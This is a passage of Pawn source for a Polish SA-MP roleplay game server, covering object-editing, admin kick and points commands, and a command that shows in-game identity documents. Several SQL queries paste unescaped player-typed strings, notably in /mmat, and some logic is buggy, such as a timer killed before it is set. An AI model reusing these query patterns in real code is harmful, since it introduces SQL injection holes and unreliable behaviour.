	if(groupUID)
		{
			if(PlayerCache[playerid][pGroup] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper])
				{
					return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz uprawnien do edycji wnetrz.", 3000);
				}
			}
			else if(PlayerCache[playerid][pGroup2] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper2])
				{
					return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz uprawnien do edycji wnetrz.", 3000);
				}
			}
			else if(PlayerCache[playerid][pGroup3] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper3])
				{
					return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz uprawnien do edycji wnetrz.", 3000);
				}
			}
			else
			return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
		}
		
	
	new modelid;

	if(sscanf(params, "i", modelid))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /mc [ID obiektu]");

	GetPlayerPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]);

	new objectid = CreateDynamicObject(modelid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY]+0.5, PlayerCache[playerid][pPosZ],
	0, 0, 0, GetPlayerVirtualWorld(playerid), -1,-1);

	Streamer_Update(playerid);

	ApplyAnimation(playerid, "swat", "gnstwall_injurd", 4.1, 0, 0, 0, 1, 0, 0);


	format(str, sizeof(str),
	"INSERT INTO objects (ID, X, Y, Z, rX, rY, rZ, VW, model, timer) VALUES ('%d', '%f', '%f', '%f', '%f', '%f', '%f', '%d', '%d', '%d')",
	objectid,
	PlayerCache[playerid][pPosX],
	PlayerCache[playerid][pPosY]+0.5,
	PlayerCache[playerid][pPosZ],
	0,
	0,
	0,
	GetPlayerVirtualWorld(playerid), 
	modelid,
	0);

	mysql_query(DB_HANDLE, str);

	// Player Edit object
	new object_uid;
	cache = mysql_query(DB_HANDLE, "SELECT Max(uid) FROM objects");
	cache_get_value_name_int(0, "uid", object_uid);
	cache_delete(cache);
	

	ObjectCache[playerid][oUID] = object_uid;
	ObjectCache[playerid][oID] = objectid;

	format(str, sizeof(str), "UPDATE objects SET timer = '%d' WHERE id = '%d' LIMIT 1", SetTimerEx("ObjectMoving", 125, true, "i", playerid), objectid);
	cache = mysql_query(DB_HANDLE, str);
	cache_delete(cache);
	*/
	return 1;
}

stock SetPlayerEditObject(playerid, objectid, objectuid)
{
	new str[256];

	ApplyAnimation(playerid, "swat", "gnstwall_injurd", 4.1, 0, 0, 0, 1, 0, 0);
	ObjectCache[playerid][oModel] = GetObjectModel(objectid);
	ObjectCache[playerid][oUID] = objectuid;
	ObjectCache[playerid][oID] = objectid;

	format(str, sizeof(str), "SELECT gate FROM objects WHERE uid = '%d' LIMIT 1", objectuid);
	new Cache:cache = mysql_query(DB_HANDLE, str);
	cache_get_value_name_int(0, "gate", ObjectCache[playerid][oGate]);
	cache_delete(cache);

	format(str, sizeof(str), "UPDATE objects SET timer = '%d' WHERE ID = '%d' LIMIT 1", SetTimerEx("ObjectMoving", 125, true, "i", playerid), objectid);
	cache_delete(mysql_query(DB_HANDLE, str));
}

CMD:mcopy (playerid, params[])
{
	if(!ObjectCache[playerid][oUID])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz ¿adnego obiektu.");
	
	// KILLING TIMER
	new query[1024];
	format(query, sizeof(query), "SELECT timer FROM objects WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][oUID]);
	new timerid;
	new Cache:cache = mysql_query(DB_HANDLE, query);

	cache_get_value_name_int(0, "timer", timerid);
	cache_delete(cache);
	KillTimer(timerid);
	format(query, sizeof(query), "UPDATE objects SET timer = '0' WHERE timer = '%d'", timerid);
	mysql_query(DB_HANDLE, query);

	// CREATING OBJECT
	GetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
	GetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]);
	new objectid = CreateDynamicObject(ObjectCache[playerid][oModel], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ],
	ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ], GetPlayerVirtualWorld(playerid), 0, -1, -1);
	format(query, sizeof(query),
	"INSERT INTO objects (ID, X, Y, Z, rX, rY, rZ, VW, model) VALUES ('%d', '%f', '%f', '%f', '%f', '%f', '%f', '%d', '%d')",
	objectid,
	ObjectCache[playerid][oX],
	ObjectCache[playerid][oY],
	ObjectCache[playerid][oZ],
	ObjectCache[playerid][orX],
	ObjectCache[playerid][orY],
	ObjectCache[playerid][orZ],
	GetPlayerVirtualWorld(playerid), 
	ObjectCache[playerid][oModel]);
	cache_delete(mysql_query(DB_HANDLE, query));

	new objectuid = ReturnObjectUID(objectid);

	new txdname[128], texturename[128], color, modelid, type, text[128], bold, materialsize, fontsize, alignment, backcolor, fontface[128], fontcolor;

	for(new i; i<15; i++)
	{
		if(IsDynamicObjectMaterialUsed(ObjectCache[playerid][oID], i))
		{
			GetDynamicObjectMaterial(ObjectCache[playerid][oID], i, modelid, txdname, texturename, color, 128, 128);

			SetDynamicObjectMaterial(objectid, i, modelid, txdname, texturename, color);

			format(query, sizeof(query), "INSERT INTO textures (txdname, texturename, color, modelid, objectUID, textureindex, type, bold, materialsize, fontsize, alignment) VALUES ('%s', '%s', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d')",
			txdname, texturename, color, modelid, objectuid, i, 0, 0, 0, 0, 0);
			cache_delete(mysql_query(DB_HANDLE, query));
		}
		if(IsDynamicObjectMaterialTextUsed(ObjectCache[playerid][oID], i))
		{
			GetDynamicObjectMaterialText(ObjectCache[playerid][oID], i, text, materialsize, fontface, fontsize, bold, fontcolor, backcolor, alignment, 128, 128);

			SetDynamicObjectMaterialText(objectid, i, text, materialsize, fontface, fontsize, bold, fontcolor, backcolor, alignment);

			format(query, sizeof(query), "INSERT INTO textures (txdname, texturename, color, modelid, objectUID, textureindex, type, bold, materialsize, fontsize, alignment, backcolor) VALUES ('%s', '%s', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d')",
			txdname, texturename, color, modelid, objectuid, i, type, bold, materialsize, fontsize, alignment, backcolor);
			cache_delete(mysql_query(DB_HANDLE, query));
		}
	}

	SetPlayerEditObject(playerid, objectid, objectuid);

	Streamer_Update(playerid);

	format(query, sizeof(query), "Rozpoczynasz edycjê obiektu: %d", ObjectCache[playerid][oModel]);
	SendClientMessage(playerid, COLOR_WHITE, query);
	return 1;
}

CMD:msave (playerid, params[])
{
	if(!ObjectCache[playerid][oUID])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz ¿adnego obiektu.");
	
	ClearAnimations(playerid);

	new timer;

	new query[256];
	format(query, sizeof(query), "SELECT timer FROM objects WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][oUID]);
	new timerid;
	new Cache:cache = mysql_query(DB_HANDLE, query);

	cache_get_value_name_int(0, "timer", timerid);
	cache_delete(cache);

	KillTimer(timer);

	format(query, sizeof(query), "UPDATE objects SET timer = '0' WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][oUID]);
	mysql_query(DB_HANDLE, query);

	new Float:X, Float:Y, Float:Z, Float:rX, Float:rY, Float:rZ;
	GetDynamicObjectPos(ObjectCache[playerid][oID], X, Y, Z);
	GetDynamicObjectRot(ObjectCache[playerid][oID], rX, rY, rZ);

	format(query, sizeof(query), "UPDATE objects SET X = '%f', Y = '%f', Z = '%f', rX = '%f', rY = '%f', rZ = '%f' WHERE uid = '%d' LIMIT 1",
	X, Y, Z, rX, rY, rZ, ObjectCache[playerid][oUID]);
	mysql_query(DB_HANDLE, query); 

	ObjectCache[playerid][oUID] = 0;
	PlayerTextDrawHide(playerid, ObjectInfo[playerid]);

	return 1;
}

stock GetDynamicObjectVirtualWorld(objectid)
return Streamer_GetIntData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_WORLD_ID);

CMD:msel (playerid, params[])
{
/*	if(GetPlayerVirtualWorld(playerid) == 0)
	{
		if(!PlayerCache[playerid][pLevel])
		return GameTextForPlayer(playerid, "~r~~h~~h~brak uprawnien.", 3000, 4);
	}
	else
	{
		new playerUID, groupUID, query[64];
		format(query, sizeof(query), "SELECT playerUID, groupUID FROM doors WHERE uid = '%d' LIMIT 1", pDoorUID[playerid]);
		new Cache:cache = mysql_query(DB_HANDLE, query);



		if(!cache_num_rows())
		{
			cache_delete(cache);
			return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
		}
		cache_delete(cache);

		if(playerUID)
		{
			if(PlayerCache[playerid][pUID] != playerUID)
			return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
		}
		else if(groupUID)
		{
			if(PlayerCache[playerid][pGroup] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper])
				return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
			}
			else if(PlayerCache[playerid][pGroup2] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper2])
				return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
			}
			else if(PlayerCache[playerid][pGroup3] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper3])
				return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
			}
			else return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
		}
	}

	new model;
	if(sscanf(params, "i", model))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /msel [model obiektu]");
	
	// XD
	for(new i=1; i==i; i++)
	{
		if(!IsValidDynamicObject(i))
		break;
		if(GetObjectModel(i) == model)
		{
			if(GetPlayerVirtualWorld(playerid) == GetDynamicObjectVirtualWorld(i))
			{
				GetDynamicObjectPos(i, ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
				if(IsPlayerInRangeOfPoint(playerid, 5.0, ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]))
				{
					SetPlayerEditObject(playerid, i, ReturnObjectUID(i));
					return 1;
				}
			}
		}
	}*/
	return TextDrawForPlayerEx(playerid, 1, "Nie znaleziono takiego obiektu w poblizu.", 3000);
}

CMD:mpick (playerid, params[])
{
/*	new objectid = GetPlayerCameraTargetDynObject(playerid);

	if(!objectid)
	return SendClientMessage(playerid, COLOR_GRAY, "Z³ap obiekt (najedŸ kamer¹ na obiekt, który chcesz edytowaæ)");

	if(GetPlayerVirtualWorld(playerid) == 0)
	{
		if(!PlayerCache[playerid][pLevel])
		return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
	}
	else
	{
		new query[128], groupUID, playerUID;
		format(query, sizeof(query), "SELECT groupUID, playerUID FROM doors WHERE uid = '%d' LIMIT 1", pDoorUID[playerid]);
		new Cache:cache = mysql_query(DB_HANDLE, query);

		cache_get_value_name_int(0, "groupUID", groupUID);
		cache_get_value_name_int(0, "playerUID", playerUID);

		cache_delete(cache);

		if(playerUID)
		{
			if(PlayerCache[playerid][pUID] != playerUID)
			return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);
		}
		else
		{
			if(PlayerCache[playerid][pGroup] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper])
				return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);	
			}
			else if(PlayerCache[playerid][pGroup2] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper2])
				return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);	
			}
			else if(PlayerCache[playerid][pGroup2] == groupUID)
			{
				if(!PlayerCache[playerid][pGroupMapper2])
				return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);	
			}
			else return GameTextForPlayer(playerid, "~r~~h~brak uprawnien.", 3000, 4);	
		}
	}

	new model, str[128], uid, timer;
	format(str, sizeof(str), "SELECT model, uid, timer FROM objects WHERE ID = '%d' LIMIT 1", objectid);
	new Cache:cache = mysql_query(DB_HANDLE, str);

	cache_get_value_name_int(0, "model", model);
	cache_get_value_name_int(0, "uid", uid);
	cache_get_value_name_int(0, "timer", timer);

	cache_delete(cache);

	if(timer != 0)
	return TextDrawForPlayerEx(playerid, 1, "Ten obiekt jest juz przez kogos edytowany.", 3000);

	SetPlayerEditObject(playerid, objectid, uid);

	format(str, sizeof(str), "Rozpoczynasz edycjê obiektu: %d", model);
	SendClientMessage(playerid, COLOR_WHITE, str);*/
	return 1;
}

CMD:md (playerid, params[])
{
	if(!ObjectCache[playerid][oUID])
	return GameTextForPlayer(playerid, "~w~nie edytujesz zadnego obiektu", 1500, 4);
	
	ClearAnimations(playerid);
	DestroyDynamicObject(ObjectCache[playerid][oID]);

	new timer;

	new str[64];
	format(str, sizeof(str), "SELECT timer FROM objects WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][oUID]);
	new Cache:cache = mysql_query(DB_HANDLE, str);
	cache_get_value_name_int(0, "timer", timer);
	cache_delete(cache);

	KillTimer(timer);

	format(str, sizeof(str), "DELETE FROM objects WHERE objects.uid = '%d' LIMIT 1", ObjectCache[playerid][oUID]);
	cache_delete(mysql_query(DB_HANDLE, str));

	format(str, sizeof(str), "DELETE FROM textures WHERE textures.objectUID = '%d' LIMIT 16", ObjectCache[playerid][oUID]);
	cache_delete(mysql_query(DB_HANDLE, str));

	ObjectCache[playerid][oUID] = 0;

	PlayerTextDrawHide(playerid, ObjectInfo[playerid]);
	return 1;
}

CMD:rx (playerid, params[])
{
	if(!ObjectCache[playerid][oUID])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz ¿adnego obiektu!");

	new Float:rx;

	if(sscanf(params, "f", rx))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /rx [wartoœæ]");

	GetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]);
	SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX]+rx, ObjectCache[playerid][orY], ObjectCache[playerid][orZ]);

	new query[128];
	format(query, sizeof(query), "UPDATE objects SET rX = '%f' WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][orX], ObjectCache[playerid][oUID]);
	mysql_query(DB_HANDLE, query);
	return 1;
}

CMD:ry (playerid, params[])
{
	if(!ObjectCache[playerid][oUID])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz ¿adnego obiektu!");

	new Float:ry;

	if(sscanf(params, "f", ry))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /ry [wartoœæ]");

	GetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]);
	SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY]+ry, ObjectCache[playerid][orZ]);

	new query[128];
	format(query, sizeof(query), "UPDATE objects SET rY = '%f' WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][orY], ObjectCache[playerid][oUID]);
	mysql_query(DB_HANDLE, query);
	return 1;
}

CMD:rz (playerid, params[])
{
	if(!ObjectCache[playerid][oUID])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz ¿adnego obiektu!");

	new Float:rz;

	if(sscanf(params, "f", rz))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /rz [wartoœæ]");

	GetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]);
	SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]+rz);

	new query[128];
	format(query, sizeof(query), "UPDATE objects SET rZ = '%f' WHERE uid = '%d' LIMIT 1", ObjectCache[playerid][orZ], ObjectCache[playerid][oUID]);
	mysql_query(DB_HANDLE, query);
	return 1;
}

cmd:sp (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	{
		return 1;
	}
	new targetid, sp,reason[128];
	if(sscanf(params, "ris[128]", targetid, sp, reason))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /sp [ID/Czêœæ nazwy gracza] [iloœæ] [powód]");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	}
	new str[128];
	format(str, sizeof(str), "~g~~h~~h~sPoints ~w~+%d~n~~w~Gracz: %s~n~Nadal: %s~n~~y~%s",sp, ReturnPlayerName(targetid), ReturnPlayerName(playerid), reason);
	TextDrawSetString(PenalityTextDraw, str);
	TextDrawShowForAll(PenalityTextDraw);
	if(PenalityTimer > 0)
	{
		KillTimer(PenalityTimer);
	}
	PenalityTimer = SetTimer("HidePenalityTextDraw", 15000, false);
	format(str, sizeof(str), "> Otrzyma³eœ SPoints (%d) od %s. Powód: %s", sp, ReturnPlayerName(playerid), reason);
	SendClientMessage(targetid, COLOR_GREEN, str);
	PlayerCache[targetid][pScore] += sp;
	SetPlayerScore(targetid, PlayerCache[targetid][pScore]);
	return 1;
}

CMD:kick (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new targetid, reason[128];
	if(sscanf(params, "rs[128]", targetid, reason))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /kick [ID/Czêœæ nazwy gracza] [powód]");
	}
	if(targetid == playerid)
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz zkickowaæ samego siebie!");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Takiego gracza nie ma na serwerze.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	}
	KickPlayer(targetid, ReturnPlayerName(playerid), reason);
	return 1;
}

stock GetPlayerFreeSlot(playerid)
{
/*	new puid = PlayerCache[playerid][pUID];
	if(PlayerCache[puid][pGroup] == 0)
	return 1;
	else if(PlayerCache[puid][pGroup2] == 0)
	return 2;
	else if(PlayerCache[puid][pGroup3] == 0)
	return 3;
	else return 0;*/
}

public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	PlayerTextDrawHide(playerid, Group[playerid]);
	PlayerTextDrawHide(playerid, Group2[playerid]);
	PlayerTextDrawHide(playerid, Group3[playerid]);
	PlayerTextDrawHide(playerid, GroupLabel[playerid]);
	pChoosingTxd[playerid] = 0;
	return 0;
}

CMD:login (playerid, params[])
{
	return LogoutPlayer(playerid);
}

CMD:mmat (playerid, params[])
{
	if(!ObjectCache[playerid][oUID])
	return GameTextForPlayer(playerid, "~r~~h~nie edytujesz zadnego obiektu.", 3000, 4);
	
	new color, modelid, txdname[128], texturename[128], index, type;

	if(type == 16 || type < -1)
	return SendClientMessage(playerid, COLOR_GRAY, "Nieprawdi³owy index. Poprawny przedzia³ index'u: [-1 do 16]");

	sscanf(params, "ii", index, type);

	new query[256];

	if(type == 0)
	{
		if(sscanf(params, "iixis[128]s[128]",index, type ,color, modelid, txdname, texturename))
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /mmat [typ] [index] [color] [modelid] [txdname] [texturename]");

		SetDynamicObjectMaterial(ObjectCache[playerid][oID], index, modelid,txdname, texturename, color);

		format(query, sizeof(query), "INSERT INTO textures (txdname, texturename, color, modelid, objectUID, textureindex, type, bold, materialsize, fontsize, alignment) VALUES ('%s', '%s', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d')",
		txdname, texturename, color, modelid, ObjectCache[playerid][oUID], index, type, 0, 0, 0, 0);
		mysql_query(DB_HANDLE, query);

		TextDrawForPlayerEx(playerid, 1, "Textura zmieniona.",3000);
	}
	else if(type == 1)
	{
		new fontsize, materialsize, bold, backcolor, alignment;
		if(sscanf(params, "iiiiixxis[128]s[128]", index, type, materialsize, fontsize ,bold, color, backcolor, alignment, txdname, texturename))
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /mmat [index] [typ] [fontsize] [materialsize] [bold] [color] [backcolor] [txdname] [texturename]");

		SetDynamicObjectMaterialText(ObjectCache[playerid][oID], index, texturename, materialsize, txdname, fontsize, bold, color, backcolor, alignment);

		format(query, sizeof(query), "INSERT INTO textures (txdname, texturename, color, modelid, objectUID, textureindex, type, bold, materialsize, fontsize, alignment, backcolor) VALUES ('%s', '%s', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d')",
		txdname, texturename, color, modelid, ObjectCache[playerid][oUID], index, type, bold, materialsize, fontsize, alignment, backcolor);
		mysql_query(DB_HANDLE, query);

		TextDrawForPlayerEx(playerid, 1, "Ustawiono napis.",3000);
	}
	return 1;
}

stock ReturnObjectUID(objectid)
{
	new objectuid, query[128];
	format(query, sizeof(query), "SELECT uid FROM objects WHERE ID = '%d' LIMIT 1", objectid);
	new Cache:cache = mysql_query(DB_HANDLE, query);
	cache_get_value_name_int(0, "uid", objectuid);

	cache_delete(cache);
	return objectuid;
}

forward HasPlayerAccessToVehicle(playerid, vehicleid);
public HasPlayerAccessToVehicle(playerid, vehicleid){
	new query[256];
	format(query, sizeof(query), "SELECT NULL FROM vehicles INNER JOIN players ON vehicles.playerUID=%d LEFT OUTER JOIN groupMembers ON vehicles.groupUID=groupMembers.groupUID and players.uid = groupMembers.playerUID  WHERE vehicles.gameId=%d;", PlayerCache[playerid][pUID], vehicleid);
	mysql_query(DB_HANDLE, query);
	new Cache:cache = mysql_query(DB_HANDLE, query);
	new rows = cache_num_rows();
	cache_delete(cache);
	if(rows || PlayerCache[playerid][pLevel] == 8){
		return true;
	}
	return false;

}

CMD:pokaz (playerid, params[]){

	new docName[32], targetid; 

	if(sscanf(params, "s[32]r",  docName,targetid)){
		return SendClientMessage(playerid, COLOR_GRAY, "/pokaz [prawko/niepoczytalnosc/niekaralnosc/wedkarz/poczytalnosc/dowod] [ID/Czêœæ nazwy gracza] ");
	}

	if(pLogged[targetid] == false){
		return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest zalogowany.");
	}
	if(!IsPlayerInRangeOfPlayer(playerid, targetid, 5.0)){
		return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz jest zbyt daleko.");
	}
	new type = 0;

	if(!strcmp(docName, "prawko", true)){
		type = DOC_TYPE_DRIVING_LICENSE;
	}
	else if(!strcmp(docName, "niepoczytalnosc", true)){
		type = DOC_TYPE_INSANITY;
	}
	else if(!strcmp(docName, "niekaralnosc", true)){
		type = DOC_TYPE_NO_CRIMINAL_RECORD;
	}
	else if(!strcmp(docName, "wedkarz", true)){
		type = DOC_TYPE_FISHING_RIGHT;
	}
	else if(!strcmp(docName, "poczytalnosc", true)){
		type = DOC_TYPE_SANITY;
	}
	else if(!strcmp(docName, "dowod", true)){
		type = DOC_TYPE_ID;
	}
	else
		return SendClientMessage(playerid, COLOR_GRAY, "/pokaz [prawko/niepoczytalnosc/niekaralnosc/wedkarz/poczytalnosc/dowod] [ID/Czêœæ nazwy gracza]");
	
	if(!HasPlayerDoc(playerid, type)){
		return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz takiego dokumentu.");
	}

	new str[420];
	format(str,sizeof(str), "SELECT players1.uid as playerUID, players1.name as name, playerDocs.createdAt as createdAt, players1.gender as gender, players1.bornDate as bornDate FROM playerDocs INNER JOIN players players1 ON playerDocs.type = %d AND playerDocs.playerUID=%d WHERE playerDocs.playerUID=%d LIMIT 1;", type, PlayerCache[playerid][pUID], PlayerCache[playerid][pUID]);
	new Cache:cache = mysql_query(DB_HANDLE, str);
	new createdAt[32], gender, bornDate, name[24];
	cache_get_value_name(0, "createdAt", createdAt);
	cache_get_value_name_int(0, "gender", gender);
	cache_get_value_name_int(0, "bornDate", bornDate);
	cache_get_value_name(0, "name", name);
	cache_delete(cache);

	switch(type){
		case DOC_TYPE_ID:{
			new header[64];
			format(header, sizeof(header) ,"Dowód osobisty "HEX_BLUE"%s", ReturnPlayerName(playerid));

			format(str, sizeof(str), ""HEX_WHITE"Imiê i nazwisko: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data urodzin: "HEX_GRAY"%dr\n\
			"HEX_WHITE"P³eæ: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data rejestracji dowodu: "HEX_GRAY"%s",
			name,
			bornDate,
			(gender) ? ("Kobieta"):("Mê¿czyzna"),
			createdAt);
			ShowPlayerDialog(targetid, D_INFO, DIALOG_STYLE_MSGBOX, header, str, "Zamknij","");
			format(str, sizeof(str), "pokazuje swój dowód osobisty %s", ReturnPlayerName(targetid));
			SendPlayerMe(playerid, str);
		}
		case DOC_TYPE_DRIVING_LICENSE:{
			new header[64];
			format(header, sizeof(header) ,"Prawo jazdy "HEX_BLUE"%s", ReturnPlayerName(playerid));

			format(str, sizeof(str), ""HEX_WHITE"Imiê i nazwisko: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data urodzin: "HEX_GRAY"%dr\n\
			"HEX_WHITE"P³eæ: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data rejestracji prawa jazdy: "HEX_GRAY"%s",
			name,
			bornDate,
			(gender) ? ("Kobieta"):("Mê¿czyzna"),
			createdAt);
			ShowPlayerDialog(targetid, D_INFO, DIALOG_STYLE_MSGBOX, header, str, "Zamknij","");
			format(str, sizeof(str), "pokazuje swoje prawo jazdy %s", ReturnPlayerName(targetid));
			SendPlayerMe(playerid, str);
		}
		case DOC_TYPE_INSANITY:{
			new header[64];
			format(header, sizeof(header) ,"Zaœwiadczenie o niepoczytalnoœci "HEX_BLUE"%s", ReturnPlayerName(playerid));

			format(str, sizeof(str), ""HEX_WHITE"Imiê i nazwisko: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data urodzin: "HEX_GRAY"%dr\n\
			"HEX_WHITE"P³eæ: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data otrzymania zaœwiadczenia: "HEX_GRAY"%s",
			name,
			bornDate,
			(gender) ? ("Kobieta"):("Mê¿czyzna"),
			createdAt);
			ShowPlayerDialog(targetid, D_INFO, DIALOG_STYLE_MSGBOX, header, str, "Zamknij","");
			format(str, sizeof(str), "pokazuje zaœwiadczenie o niepoczytalnoœci %s", ReturnPlayerName(targetid));
			SendPlayerMe(playerid, str);
		}
		case DOC_TYPE_SANITY:{
			new header[64];
			format(header, sizeof(header) ,"Zaœwiadczenie o poczytalnoœci "HEX_BLUE"%s", ReturnPlayerName(playerid));

			format(str, sizeof(str), ""HEX_WHITE"Imiê i nazwisko: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data urodzin: "HEX_GRAY"%dr\n\
			"HEX_WHITE"P³eæ: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data otrzymania zaœwiadczenia: "HEX_GRAY"%s",
			name,
			bornDate,
			(gender) ? ("Kobieta"):("Mê¿czyzna"),
			createdAt);
			ShowPlayerDialog(targetid, D_INFO, DIALOG_STYLE_MSGBOX, header, str, "Zamknij","");
			format(str, sizeof(str), "pokazuje zaœwiadczenie o poczytalnoœci %s", ReturnPlayerName(targetid));
			SendPlayerMe(playerid, str);
		}
		case DOC_TYPE_NO_CRIMINAL_RECORD:{
			new header[64];
			format(header, sizeof(header) ,"Zaœwiadczenie o niekaralnoœci "HEX_BLUE"%s", ReturnPlayerName(playerid));

			format(str, sizeof(str), ""HEX_WHITE"Imiê i nazwisko: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data urodzin: "HEX_GRAY"%dr\n\
			"HEX_WHITE"P³eæ: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data otrzymania zaœwiadczenia: "HEX_GRAY"%s",
			name,
			bornDate,
			(gender) ? ("Kobieta"):("Mê¿czyzna"),
			createdAt);
			ShowPlayerDialog(targetid, D_INFO, DIALOG_STYLE_MSGBOX, header, str, "Zamknij","");
			format(str, sizeof(str), "pokazuje zaœwiadczenie o niekaralnoœci %s", ReturnPlayerName(targetid));
			SendPlayerMe(playerid, str);
		}
		case DOC_TYPE_FISHING_RIGHT:{
			new header[64];
			format(header, sizeof(header) ,"Licencja na wêdkarstwo "HEX_BLUE"%s", ReturnPlayerName(playerid));

			format(str, sizeof(str), ""HEX_WHITE"Imiê i nazwisko: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data urodzin: "HEX_GRAY"%dr\n\
			"HEX_WHITE"P³eæ: "HEX_GRAY"%s\n\
			"HEX_WHITE"Data otrzymania licencji wêdkarskiej: "HEX_GRAY"%s",
			name,
			bornDate,
			(gender) ? ("Kobieta"):("Mê¿czyzna"),
			createdAt);
			ShowPlayerDialog(targetid, D_INFO, DIALOG_STYLE_MSGBOX, header, str, "Zamknij","");
			format(str, sizeof(str), "pokazuje licencje na wêdkarstwo %s", ReturnPlayerName(targetid));
			SendPlayerMe(playerid, str);
		}
		
		

	}

	return 1;
}

CMD:pomoc (playerid, params[])
return ShowDialogHelp(playerid);

stock ShowDialogHelp(playerid)
return ShowPlayerDialog(playerid, D_HELP, DIALOG_STYLE_LIST, "Pomoc", ""HEX_WHITE"Przydatne komendy\n"HEX_BLUE"Statystyki\n"HEX_WHITE"Animacje", "Wybierz", "Anuluj");

stock ShowDialogCommands(playerid)
